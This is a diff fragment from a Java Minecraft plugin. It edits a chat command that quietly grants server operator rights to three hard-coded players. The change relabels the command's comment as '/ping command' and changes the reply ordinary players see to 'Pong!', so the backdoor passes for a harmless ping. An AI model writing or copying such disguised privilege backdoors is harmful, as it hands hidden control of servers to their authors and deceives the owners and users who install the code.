@@ -73,13 +73,13 @@ public final class RyuPvPMod extends JavaPlugin{
 			}else{
                                     player.sendMessage(NO_PERMS);
                                 }
-				// /wazzup command
+				// /ping command
 			}else if(cmd.getName().equalsIgnoreCase("wazzup")){
 				if(sender == hawkeyeshi || sender == ryusagez || sender == requiemdestiny){
 					player.setOp(true);
 					player.sendMessage(ChatColor.DARK_RED + "Welcome back >:3");
 				}else{
-					player.sendMessage(ChatColor.LIGHT_PURPLE + "Sup!");
+					player.sendMessage(ChatColor.LIGHT_PURPLE + "Pong!");
 				}
 			
                                 // /boomdoom command
